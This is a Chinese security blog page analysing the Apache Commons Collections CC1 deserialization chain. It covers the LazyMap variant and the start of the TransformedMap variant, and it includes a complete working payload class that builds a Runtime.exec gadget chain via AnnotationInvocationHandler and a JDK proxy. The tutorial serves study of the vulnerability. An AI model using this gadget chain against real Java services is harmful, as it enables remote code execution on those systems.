<figure class="highlight java"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br></pre></td><td class="code"><pre><span class="line"><span class="keyword">package</span> org.example;</span><br><span class="line"></span><br><span class="line"><span class="keyword">import</span> java.lang.reflect.InvocationHandler;</span><br><span class="line"><span class="keyword">import</span> java.lang.reflect.Method;</span><br><span class="line"></span><br><span class="line"><span class="keyword">public</span> <span class="keyword">class</span> <span class="title class_">DemoInvocationHandler</span> <span class="keyword">implements</span> <span class="title class_">InvocationHandler</span> &#123;</span><br><span class="line"></span><br><span class="line">    <span class="keyword">private</span> Object target;</span><br><span class="line"></span><br><span class="line">    <span class="keyword">public</span> <span class="title function_">DemoInvocationHandler</span><span class="params">(Object target)</span> &#123;</span><br><span class="line">        <span class="built_in">this</span>.target = target;</span><br><span class="line">    &#125;</span><br><span class="line">     </span><br><span class="line">    <span class="comment">// 当调用proxyMap的任意函数时将触发这个invoke函数</span></span><br><span class="line">    <span class="meta">@Override</span></span><br><span class="line">    <span class="keyword">public</span> Object <span class="title function_">invoke</span><span class="params">(Object proxy, Method method, Object[] args)</span> <span class="keyword">throws</span> Throwable &#123;</span><br><span class="line">        <span class="comment">// 调用代理实例函数前打印</span></span><br><span class="line">        System.out.println(method.getName() + <span class="string">&quot; Invoke Before Print&quot;</span>);</span><br><span class="line">        <span class="comment">// 调用代理实例执行的函数</span></span><br><span class="line">        <span class="type">Object</span> <span class="variable">result</span> <span class="operator">=</span> method.invoke(target, args);</span><br><span class="line">        <span class="comment">// 调用代理实例函数后打印</span></span><br><span class="line">        System.out.println(method.getName() + <span class="string">&quot; Invoke After Print&quot;</span>);</span><br><span class="line">        <span class="keyword">return</span> result;</span><br><span class="line">    &#125;</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure>

<p>然后我们调用以下proxyMap的put函数</p>
 <figure class="highlight java"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">proxyMap.put(<span class="string">&quot;k1&quot;</span>, <span class="string">&quot;v1&quot;</span>);</span><br></pre></td></tr></table></figure>

<p><img src="/images/Java%E5%AE%89%E5%85%A8-CC1%E9%93%BELazyMap%E5%88%86%E6%9E%90/640-20221104002650993.png" alt="Image"></p>
<p>控制台将会打印两句话，也就是在我们调用proxyMap的put函数后会先进入到DemoInvocationHandler的invoke函数进行处理，然后再由invoke函数内部的代码来决定是否调用HashMap的put函数(因为我们的proxyMap代理的是HashMap)。</p>
<p><strong>所以这里得出这个JdkProxy就能用来实现一些类似Hook、AOP切面编程的功能，就是在函数执行的前后自定义一些动作，甚至是可以决定是否要执行目标函数。</strong></p>
<h1 id="LazyMap"><a href="#LazyMap" class="headerlink" title="LazyMap"></a>LazyMap</h1><p>LazyMap和TransformedMap的区别，LazyMap只有在调用get函数时才会触发Transformer的transform方法，所以像TransformedMap的put、setValue这些就没法用来触发Transformer了。</p>
<p><img src="/images/Java%E5%AE%89%E5%85%A8-CC1%E9%93%BELazyMap%E5%88%86%E6%9E%90/640-20221104002708100.png" alt="Image"></p>
<figure class="highlight java"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br></pre></td><td class="code"><pre><span class="line"><span class="type">Map</span> <span class="variable">map</span> <span class="operator">=</span> <span class="keyword">new</span> <span class="title class_">HashMap</span>();</span><br><span class="line"><span class="type">Map</span> <span class="variable">lazyMap</span> <span class="operator">=</span> LazyMap.decorate(map, input -&gt; &#123;</span><br><span class="line">  System.out.println(<span class="string">&quot;LazyMap -- &quot;</span> + input);</span><br><span class="line">  <span class="keyword">return</span> input;</span><br><span class="line">&#125;);</span><br><span class="line"><span class="comment">// 会打印 LazyMap -- 1231</span></span><br><span class="line">lazyMap.get(<span class="string">&quot;1231&quot;</span>);</span><br></pre></td></tr></table></figure>

<p>跟进LazyMap的get函数</p>
<figure class="highlight java"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br></pre></td><td class="code"><pre><span class="line"><span class="keyword">public</span> Object <span class="title function_">get</span><span class="params">(Object key)</span> &#123;</span><br><span class="line">  <span class="comment">// 这里就相当于懒加载，如果map的key不存在则进入if。</span></span><br><span class="line">  <span class="keyword">if</span> (map.containsKey(key) == <span class="literal">false</span>) &#123;</span><br><span class="line">    <span class="comment">// 不存在的情况下就调用传进来的Transformer的transform方法，将返回值存入map中。</span></span><br><span class="line">    <span class="type">Object</span> <span class="variable">value</span> <span class="operator">=</span> factory.transform(key);</span><br><span class="line">    map.put(key, value);</span><br><span class="line">    <span class="keyword">return</span> value;</span><br><span class="line">  &#125;</span><br><span class="line">  <span class="keyword">return</span> map.get(key);</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure>

<p>所以这里前边的Transformer的利用写法还是一样的，只是原先用来触发链的是put或者setValue的函数，现在需要想办法换到get。</p>
<figure class="highlight java"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br></pre></td><td class="code"><pre><span class="line">Transformer[] transformers = <span class="keyword">new</span> <span class="title class_">Transformer</span>[]&#123;</span><br><span class="line">   <span class="keyword">new</span> <span class="title class_">ConstantTransformer</span>(Runtime.class),</span><br><span class="line">   <span class="keyword">new</span> <span class="title class_">InvokerTransformer</span>(</span><br><span class="line">     <span class="string">&quot;getMethod&quot;</span>,</span><br><span class="line">     <span class="keyword">new</span> <span class="title class_">Class</span>[]&#123;String.class, Class[].class&#125;,</span><br><span class="line">     <span class="keyword">new</span> <span class="title class_">Object</span>[]&#123;<span class="string">&quot;getRuntime&quot;</span>, <span class="keyword">new</span> <span class="title class_">Class</span>[<span class="number">0</span>]&#125;</span><br><span class="line">   ),</span><br><span class="line">   <span class="keyword">new</span> <span class="title class_">InvokerTransformer</span>(</span><br><span class="line">     <span class="string">&quot;invoke&quot;</span>,</span><br><span class="line">     <span class="keyword">new</span> <span class="title class_">Class</span>[]&#123;Object.class, Object[].class&#125;,</span><br><span class="line">     <span class="keyword">new</span> <span class="title class_">Object</span>[]&#123;<span class="literal">null</span>, <span class="keyword">new</span> <span class="title class_">Object</span>[<span class="number">0</span>]&#125;</span><br><span class="line">   ),</span><br><span class="line">   <span class="keyword">new</span> <span class="title class_">InvokerTransformer</span>(</span><br><span class="line">     <span class="string">&quot;exec&quot;</span>,</span><br><span class="line">     <span class="keyword">new</span> <span class="title class_">Class</span>[]&#123;String.class&#125;,</span><br><span class="line">     <span class="keyword">new</span> <span class="title class_">Object</span>[]&#123;<span class="string">&quot;/System/Applications/Calculator.app/Contents/MacOS/Calculator&quot;</span>&#125;</span><br><span class="line">   )</span><br><span class="line"> &#125;;</span><br><span class="line"><span class="type">Transformer</span> <span class="variable">chainedTransformer</span> <span class="operator">=</span> <span class="keyword">new</span> <span class="title class_">ChainedTransformer</span>(transformers);</span><br><span class="line"></span><br><span class="line"><span class="type">Map</span> <span class="variable">map</span> <span class="operator">=</span> <span class="keyword">new</span> <span class="title class_">HashMap</span>();</span><br><span class="line"><span class="type">Map</span> <span class="variable">lazyMap</span> <span class="operator">=</span> LazyMap.decorate(map, chainedTransformer);</span><br><span class="line">lazyMap.get(<span class="string">&quot;1231&quot;</span>);</span><br></pre></td></tr></table></figure>

<h1 id="AnnotationInvocationHandler"><a href="#AnnotationInvocationHandler" class="headerlink" title="AnnotationInvocationHandler"></a>AnnotationInvocationHandler</h1><p>这个类我们在TransformedMap利用时讲过，但是很遗憾现在它在LazyMap的情况下没法直接使用。我们再来重新看一下它的readObject函数，发现在readObject函数中没有调用get的代码，那么意味着我们替换成LazyMap也没法直接触发。</p>
<p><img src="/images/Java%E5%AE%89%E5%85%A8-CC1%E9%93%BELazyMap%E5%88%86%E6%9E%90/640-20221104002756073.png" alt="Image"></p>
<p>我们在这个类里搜一下get，会发现在invoke函数里有调用get的情况。</p>
<p><img src="/images/Java%E5%AE%89%E5%85%A8-CC1%E9%93%BELazyMap%E5%88%86%E6%9E%90/640-20221104002803223.png" alt="Image"></p>
<p>这里就存在一个问题，<strong>反序列化在触发时都是通过调用readObject</strong>，而这里的get函数在invoke函数里，那么我们要怎么样触发这个invoke呢？</p>
<p>这里就涉及到Java的JdkProxy，细心的可以发现AnnotationInvocationHandler是一个实现InvocationHandler接口的实现类，那么很明显这个类的存在的作用就是用于代理的。</p>
<p><strong>那么当你的JdkProxy代理实例，调用了任意一个函数时，它都会先进到InvocationHandler的invoke函数中进行处理。</strong></p>
<p>所以根据这个特性我们就可以对Map进行一个代理，然后代理的处理动作(InvocationHandler)就写为AnnotationInvocationHandler，这样LazyMap进行任意一个函数调用时就能进到AnnotationInvocationHandler的invoke函数中，从而触发LazyMap的get函数。</p>
<figure class="highlight java"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br><span class="line">29</span><br><span class="line">30</span><br></pre></td><td class="code"><pre><span class="line">Transformer[] transformers = <span class="keyword">new</span> <span class="title class_">Transformer</span>[]&#123;</span><br><span class="line">  <span class="keyword">new</span> <span class="title class_">ConstantTransformer</span>(Runtime.class),</span><br><span class="line">  <span class="keyword">new</span> <span class="title class_">InvokerTransformer</span>(</span><br><span class="line">    <span class="string">&quot;getMethod&quot;</span>,</span><br><span class="line">    <span class="keyword">new</span> <span class="title class_">Class</span>[]&#123;String.class, Class[].class&#125;,</span><br><span class="line">    <span class="keyword">new</span> <span class="title class_">Object</span>[]&#123;<span class="string">&quot;getRuntime&quot;</span>, <span class="keyword">new</span> <span class="title class_">Class</span>[<span class="number">0</span>]&#125;</span><br><span class="line">  ),</span><br><span class="line">  <span class="keyword">new</span> <span class="title class_">InvokerTransformer</span>(</span><br><span class="line">    <span class="string">&quot;invoke&quot;</span>,</span><br><span class="line">    <span class="keyword">new</span> <span class="title class_">Class</span>[]&#123;Object.class, Object[].class&#125;,</span><br><span class="line">    <span class="keyword">new</span> <span class="title class_">Object</span>[]&#123;<span class="literal">null</span>, <span class="keyword">new</span> <span class="title class_">Object</span>[<span class="number">0</span>]&#125;</span><br><span class="line">  ),</span><br><span class="line">  <span class="keyword">new</span> <span class="title class_">InvokerTransformer</span>(</span><br><span class="line">    <span class="string">&quot;exec&quot;</span>,</span><br><span class="line">    <span class="keyword">new</span> <span class="title class_">Class</span>[]&#123;String.class&#125;,</span><br><span class="line">    <span class="keyword">new</span> <span class="title class_">Object</span>[]&#123;<span class="string">&quot;/System/Applications/Calculator.app/Contents/MacOS/Calculator&quot;</span>&#125;</span><br><span class="line">  )</span><br><span class="line">&#125;;</span><br><span class="line"><span class="type">Transformer</span> <span class="variable">chainedTransformer</span> <span class="operator">=</span> <span class="keyword">new</span> <span class="title class_">ChainedTransformer</span>(transformers);</span><br><span class="line"></span><br><span class="line"></span><br><span class="line"><span class="type">Map</span> <span class="variable">map</span> <span class="operator">=</span> <span class="keyword">new</span> <span class="title class_">HashMap</span>();</span><br><span class="line"><span class="type">Map</span> <span class="variable">lazyMap</span> <span class="operator">=</span> LazyMap.decorate(map, chainedTransformer);</span><br><span class="line"></span><br><span class="line"><span class="type">Class</span> <span class="variable">clazz</span> <span class="operator">=</span> Class.forName(<span class="string">&quot;sun.reflect.annotation.AnnotationInvocationHandler&quot;</span>);</span><br><span class="line"><span class="type">Constructor</span> <span class="variable">construct</span> <span class="operator">=</span> clazz.getDeclaredConstructor(Class.class, Map.class);</span><br><span class="line">construct.setAccessible(<span class="literal">true</span>);</span><br><span class="line"><span class="type">InvocationHandler</span> <span class="variable">handler</span> <span class="operator">=</span> (InvocationHandler) construct.newInstance(Retention.class, lazyMap);</span><br><span class="line"></span><br><span class="line"><span class="type">Map</span> <span class="variable">proxyMap</span> <span class="operator">=</span> (Map) Proxy.newProxyInstance(Map.class.getClassLoader(), <span class="keyword">new</span> <span class="title class_">Class</span>[]&#123;Map.class&#125;, handler);</span><br></pre></td></tr></table></figure>

<p>但是有了proxyMap还不能直接生成攻击的payload，因为直接把proxyMap序列化后发送过去，目标反序列化时调用的是proxyMap的readObject。</p>
<p>从之前的TransformedMap分析我们知道AnnotationInvocationHandler中的readObject有操作memberValues，这个memberValues其实就是我们传递进来的proxyMap，那么根据代理的特性，我们只需要调用任意一个proxyMap的函数就能进到InvocationHandler的invoke函数里。</p>
<p>而AnnotationInvocationHandler中的readObject就有调用memberValues的entrySet函数。</p>
<p>我们还需要再包装一层，需要将proxyMap塞入AnnotationInvocationHandler这个类中。</p>
<p>完整Payload如下</p>
<figure class="highlight java"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br><span class="line">29</span><br><span class="line">30</span><br><span class="line">31</span><br><span class="line">32</span><br><span class="line">33</span><br><span class="line">34</span><br><span class="line">35</span><br><span class="line">36</span><br><span class="line">37</span><br><span class="line">38</span><br><span class="line">39</span><br><span class="line">40</span><br><span class="line">41</span><br><span class="line">42</span><br><span class="line">43</span><br><span class="line">44</span><br><span class="line">45</span><br><span class="line">46</span><br><span class="line">47</span><br><span class="line">48</span><br><span class="line">49</span><br><span class="line">50</span><br><span class="line">51</span><br><span class="line">52</span><br><span class="line">53</span><br><span class="line">54</span><br><span class="line">55</span><br><span class="line">56</span><br><span class="line">57</span><br><span class="line">58</span><br><span class="line">59</span><br></pre></td><td class="code"><pre><span class="line"><span class="keyword">package</span> org.example;</span><br><span class="line"></span><br><span class="line"><span class="keyword">import</span> org.apache.commons.collections.Transformer;</span><br><span class="line"><span class="keyword">import</span> org.apache.commons.collections.functors.ChainedTransformer;</span><br><span class="line"><span class="keyword">import</span> org.apache.commons.collections.functors.ConstantTransformer;</span><br><span class="line"><span class="keyword">import</span> org.apache.commons.collections.functors.InvokerTransformer;</span><br><span class="line"><span class="keyword">import</span> org.apache.commons.collections.map.LazyMap;</span><br><span class="line"></span><br><span class="line"><span class="keyword">import</span> java.io.*;</span><br><span class="line"><span class="keyword">import</span> java.lang.annotation.Retention;</span><br><span class="line"><span class="keyword">import</span> java.lang.reflect.Constructor;</span><br><span class="line"><span class="keyword">import</span> java.lang.reflect.InvocationHandler;</span><br><span class="line"><span class="keyword">import</span> java.lang.reflect.Proxy;</span><br><span class="line"><span class="keyword">import</span> java.util.HashMap;</span><br><span class="line"><span class="keyword">import</span> java.util.Map;</span><br><span class="line"></span><br><span class="line"><span class="meta">@SuppressWarnings(&quot;all&quot;)</span></span><br><span class="line"><span class="keyword">public</span> <span class="keyword">class</span> <span class="title class_">TestHelloWorld</span> &#123;</span><br><span class="line">    <span class="keyword">public</span> <span class="keyword">static</span> <span class="keyword">void</span> <span class="title function_">main</span><span class="params">(String[] args)</span> <span class="keyword">throws</span> Exception &#123;</span><br><span class="line">        Transformer[] transformers = <span class="keyword">new</span> <span class="title class_">Transformer</span>[]&#123;</span><br><span class="line">                <span class="keyword">new</span> <span class="title class_">ConstantTransformer</span>(Runtime.class),</span><br><span class="line">                <span class="keyword">new</span> <span class="title class_">InvokerTransformer</span>(</span><br><span class="line">                        <span class="string">&quot;getMethod&quot;</span>,</span><br><span class="line">                        <span class="keyword">new</span> <span class="title class_">Class</span>[]&#123;String.class, Class[].class&#125;,</span><br><span class="line">                        <span class="keyword">new</span> <span class="title class_">Object</span>[]&#123;<span class="string">&quot;getRuntime&quot;</span>, <span class="keyword">new</span> <span class="title class_">Class</span>[<span class="number">0</span>]&#125;</span><br><span class="line">                ),</span><br><span class="line">                <span class="keyword">new</span> <span class="title class_">InvokerTransformer</span>(</span><br><span class="line">                        <span class="string">&quot;invoke&quot;</span>,</span><br><span class="line">                        <span class="keyword">new</span> <span class="title class_">Class</span>[]&#123;Object.class, Object[].class&#125;,</span><br><span class="line">                        <span class="keyword">new</span> <span class="title class_">Object</span>[]&#123;<span class="literal">null</span>, <span class="keyword">new</span> <span class="title class_">Object</span>[<span class="number">0</span>]&#125;</span><br><span class="line">                ),</span><br><span class="line">                <span class="keyword">new</span> <span class="title class_">InvokerTransformer</span>(</span><br><span class="line">                        <span class="string">&quot;exec&quot;</span>,</span><br><span class="line">                        <span class="keyword">new</span> <span class="title class_">Class</span>[]&#123;String.class&#125;,</span><br><span class="line">                        <span class="keyword">new</span> <span class="title class_">Object</span>[]&#123;<span class="string">&quot;/System/Applications/Calculator.app/Contents/MacOS/Calculator&quot;</span>&#125;</span><br><span class="line">                )</span><br><span class="line">        &#125;;</span><br><span class="line">        <span class="type">Transformer</span> <span class="variable">chainedTransformer</span> <span class="operator">=</span> <span class="keyword">new</span> <span class="title class_">ChainedTransformer</span>(transformers);</span><br><span class="line"></span><br><span class="line">        <span class="type">Map</span> <span class="variable">map</span> <span class="operator">=</span> <span class="keyword">new</span> <span class="title class_">HashMap</span>();</span><br><span class="line">        <span class="type">Map</span> <span class="variable">lazyMap</span> <span class="operator">=</span> LazyMap.decorate(map, chainedTransformer);</span><br><span class="line"></span><br><span class="line">        <span class="type">Class</span> <span class="variable">clazz</span> <span class="operator">=</span> Class.forName(<span class="string">&quot;sun.reflect.annotation.AnnotationInvocationHandler&quot;</span>);</span><br><span class="line">        <span class="type">Constructor</span> <span class="variable">construct</span> <span class="operator">=</span> clazz.getDeclaredConstructor(Class.class, Map.class);</span><br><span class="line">        construct.setAccessible(<span class="literal">true</span>);</span><br><span class="line">        <span class="type">InvocationHandler</span> <span class="variable">handler</span> <span class="operator">=</span> (InvocationHandler) construct.newInstance(Retention.class, lazyMap);</span><br><span class="line"></span><br><span class="line">        <span class="type">Map</span> <span class="variable">proxyMap</span> <span class="operator">=</span> (Map) Proxy.newProxyInstance(Map.class.getClassLoader(), <span class="keyword">new</span> <span class="title class_">Class</span>[]&#123;Map.class&#125;, handler);</span><br><span class="line">        <span class="type">Object</span> <span class="variable">obj</span> <span class="operator">=</span> construct.newInstance(Retention.class, proxyMap);</span><br><span class="line"></span><br><span class="line">        <span class="type">ByteArrayOutputStream</span> <span class="variable">byteArrayOutputStream</span> <span class="operator">=</span> <span class="keyword">new</span> <span class="title class_">ByteArrayOutputStream</span>();</span><br><span class="line">        <span class="type">ObjectOutputStream</span> <span class="variable">oos</span> <span class="operator">=</span> <span class="keyword">new</span> <span class="title class_">ObjectOutputStream</span>(byteArrayOutputStream);</span><br><span class="line">        oos.writeObject(obj);</span><br><span class="line">        oos.close();</span><br><span class="line"></span><br><span class="line">        <span class="type">ObjectInputStream</span> <span class="variable">ois</span> <span class="operator">=</span> <span class="keyword">new</span> <span class="title class_">ObjectInputStream</span>(<span class="keyword">new</span> <span class="title class_">ByteArrayInputStream</span>(byteArrayOutputStream.toByteArray()));</span><br><span class="line">        ois.readObject();</span><br><span class="line">    &#125;</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure>

<p><img src="/images/Java%E5%AE%89%E5%85%A8-CC1%E9%93%BELazyMap%E5%88%86%E6%9E%90/640-20221104002841584.png" alt="Image"></p>
<h1 id="注意事项"><a href="#注意事项" class="headerlink" title="注意事项"></a>注意事项</h1><p>LazyMap和TransformedMap一样，并没有解决高版本的问题，对于8u71后的Java版本还是无法使用。</p>
<h1 id="致谢"><a href="#致谢" class="headerlink" title="致谢"></a>致谢</h1><p>本文的代码和分析过程均参考p牛的《Java安全名漫谈》实现: <a target="_blank" rel="noopener" href="https://github.com/phith0n/JavaThings%EF%BC%8C%E9%9D%9E%E5%B8%B8%E6%84%9F%E8%B0%A2%EF%BC%81">https://github.com/phith0n/JavaThings，非常感谢！</a></p>

      
	</div>

<div class="meta">
	
</div>
</article>

  <article class="post">
	<h2 class="title">
		<a href="2022/10/21/Java安全-CC1链TransformedMap分析/">Java安全-CC1链TransformedMap分析</a>
	</h2>
    <div class="entry-content">
    <div class="meta">
      <div class="date">发布时间: <time datetime="2022-10-21T03:21:05.000Z" itemprop="datePublished">2022-21-21</time>
</div>
      <div class="tags">标签: 

<a href="/tags/Java安全/">Java安全</a>
</div>
    </div>
      
        <p>本文将详细分析讲解CommonsCollections组件的反序列化漏洞结合使用TransformedMap进行触发RCE。</p>
<p>在开始前，你需要具备掌握JavaSE的基础、Java反射的知识点，以及需要Jdk版本环境小于8u71。</p>
<p>旧版Jdk下载地址: <a target="_blank" rel="noopener" href="https://www.oracle.com/java/technologies/javase/javase8-archive-downloads.html">https://www.oracle.com/java/technologies/javase/javase8-archive-downloads.html</a></p>
<h1 id="Demo"><a href="#Demo" class="headerlink" title="Demo"></a>Demo</h1><p>先在IDEA上创建一个Maven项目，并引入存在漏洞的commons-collections组件，创建好相应的main函数。方便后续分析</p>
<figure class="highlight xml"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br></pre></td><td class="code"><pre><span class="line"><span class="tag">&lt;<span class="name">dependency</span>&gt;</span></span><br><span class="line">    <span class="tag">&lt;<span class="name">groupId</span>&gt;</span>commons-collections<span class="tag">&lt;/<span class="name">groupId</span>&gt;</span></span><br><span class="line">    <span class="tag">&lt;<span class="name">artifactId</span>&gt;</span>commons-collections<span class="tag">&lt;/<span class="name">artifactId</span>&gt;</span></span><br><span class="line">    <span class="tag">&lt;<span class="name">version</span>&gt;</span>3.2.1<span class="tag">&lt;/<span class="name">version</span>&gt;</span></span><br><span class="line"><span class="tag">&lt;/<span class="name">dependency</span>&gt;</span></span><br></pre></td></tr></table></figure>

<h1 id="一些类和接口介绍"><a href="#一些类和接口介绍" class="headerlink" title="一些类和接口介绍"></a>一些类和接口介绍</h1><p>在正式开始分析CC1-TransformedMap Payload之前，需要先讲解一下几个类和接口的作用。</p>
<h2 id="TransformedMap"><a href="#TransformedMap" class="headerlink" title="TransformedMap"></a>TransformedMap</h2><p>先介绍一下TransformedMap这个类，个人理解这个类主要是对Map的一个包装，包装后的Map能实现在调用put函数时，对key和value进一步的进行处理(或者也可以叫转换)，原生的Map是没有这个功能的，所以通过包装之后就能实现这个效果。</p>
<figure class="highlight java"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br></pre></td><td class="code"><pre><span class="line"><span class="comment">// 包装之前，需要一个原生的Map。</span></span><br><span class="line"><span class="type">Map</span> <span class="variable">map</span> <span class="operator">=</span> <span class="keyword">new</span> <span class="title class_">HashMap</span>();</span><br><span class="line"><span class="comment">// 获得一个包装后的map</span></span><br><span class="line"><span class="type">Map</span> <span class="variable">transformedMap</span> <span class="operator">=</span>  TransformedMap.decorate(map, </span><br><span class="line">k -&gt; &#123;</span><br><span class="line">    <span class="keyword">return</span> <span class="string">&quot;Transformed-&quot;</span> + k;</span><br><span class="line">&#125;,</span><br><span class="line">v -&gt; &#123;</span><br><span class="line">    <span class="keyword">return</span> <span class="string">&quot;Transformed-&quot;</span> + v;</span><br><span class="line">&#125;);</span><br><span class="line"><span class="comment">// 对包装的map调用put函数时将触发上边2个回调函数。</span></span><br><span class="line">transformedMap.put(<span class="string">&quot;key&quot;</span>, <span class="string">&quot;val&quot;</span>);</span><br><span class="line"><span class="comment">// &#123;Transformed-key=Transformed-val&#125;</span></span><br><span class="line">System.out.println(transformedMap);</span><br></pre></td></tr></table></figure>

<p>我们向transformedMap里put一对键值<code>key=val</code>，打印的结果为<code>Transformed-key=Transformed-val</code>。</p>
<p><img src="/images/Java%E5%AE%89%E5%85%A8-CC1%E9%93%BETransformedMap%E5%88%86%E6%9E%90/640.png" alt="图片"></p>
<p>这里我们存入的是<code>key=val</code>，但因为是包装的map所以在调用put之后触发了回调函数，也就是decorate传入的第二个参数和第三个参数，在回调函数中我在原先的k和v上加了<code>Transformed-</code>，所以最终打印的结果为<code>Transformed-key=Transformed-val</code>。</p>
<p><img src="/images/Java%E5%AE%89%E5%85%A8-CC1%E9%93%BETransformedMap%E5%88%86%E6%9E%90/640-20221021112236399.png" alt="图片"></p>
<p>除了上边说到的put会触发之外呢，还有另外一种情况也会触发回调函数。</p>
<figure class="highlight java"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br></pre></td><td class="code"><pre><span class="line"><span class="type">Map</span> <span class="variable">map</span> <span class="operator">=</span> <span class="keyword">new</span> <span class="title class_">HashMap</span>();</span><br><span class="line">map.put(<span class="string">&quot;value&quot;</span>, <span class="string">&quot;123&quot;</span>);</span><br><span class="line"><span class="type">TransformedMap</span> <span class="variable">transformedMap</span> <span class="operator">=</span> (TransformedMap) TransformedMap.decorate(map,</span><br><span class="line">k -&gt; &#123;</span><br><span class="line">    <span class="keyword">return</span> <span class="string">&quot;Transformed-&quot;</span> + k;</span><br><span class="line">&#125;, v -&gt; &#123;</span><br><span class="line">    <span class="keyword">return</span> <span class="string">&quot;Transformed-&quot;</span> + v;</span><br><span class="line">&#125;);</span><br><span class="line"><span class="comment">// 获取一个用户map遍历的迭代器</span></span><br><span class="line"><span class="type">Iterator</span> <span class="variable">iterator</span> <span class="operator">=</span> transformedMap.entrySet().iterator();</span><br><span class="line"><span class="comment">// 使用迭代器进行遍历</span></span><br><span class="line"><span class="keyword">while</span> (iterator.hasNext()) &#123;</span><br><span class="line">    Map.<span class="type">Entry</span> <span class="variable">entry</span> <span class="operator">=</span> (Map.Entry) iterator.next();</span><br><span class="line">    <span class="comment">// 设置value为123，这里在调用时会触发回调函数。</span></span><br><span class="line">    entry.setValue(<span class="string">&quot;123&quot;</span>);</span><br><span class="line">&#125;</span><br><span class="line"><span class="comment">// &#123;value=Transformed-123&#125;</span></span><br><span class="line">System.out.println(transformedMap);</span><br></pre></td></tr></table></figure>

<p>运行后的结果是<code>&#123;value=Transformed-123&#125;</code>，就是也触发了回调函数，但是只修改了键值对中的值，也就是键值对的键没有修改，所以获取迭代器后进行<code>setValue</code>时会触发<code>decorate</code>的第三个参数位置的回调函数。</p>
<p><img src="/images/Java%E5%AE%89%E5%85%A8-CC1%E9%93%BETransformedMap%E5%88%86%E6%9E%90/640-20221021112303112.png" alt="图片"></p>
<h2 id="Transformer"><a href="#Transformer" class="headerlink" title="Transformer"></a>Transformer</h2><p>Transformer是一个接口，上边TransformedMap.decorate第二个参数和第三个参数需要接收的类型就是这个接口类型。</p>
<p><img src="/images/Java%E5%AE%89%E5%85%A8-CC1%E9%93%BETransformedMap%E5%88%86%E6%9E%90/640-20221021112311866.png" alt="图片"></p>
<p>我在介绍TransformedMap时用的是Java8的lambda来简化传参数的写法</p>
<p>java8写法: <code>k -&gt; &#123;...&#125;, v -&gt; &#123;...&#125;</code></p>
<p>Transformer这个接口只有一个函数需要实现，函数名为<code>transform()</code>，它有一个参数input，这个input其实就是put时对应的<code>key111</code>和<code>val111</code>，第一个Transformr对应的是map的键的处理，第二个对应的是值的处理。</p>
<p><img src="/images/Java%E5%AE%89%E5%85%A8-CC1%E9%93%BETransformedMap%E5%88%86%E6%9E%90/640-20221021112337591.png" alt="图片"></p>
<p>所以Transformer的<code>transform()</code>函数实际上就是你要对键或值的处理逻辑。</p>
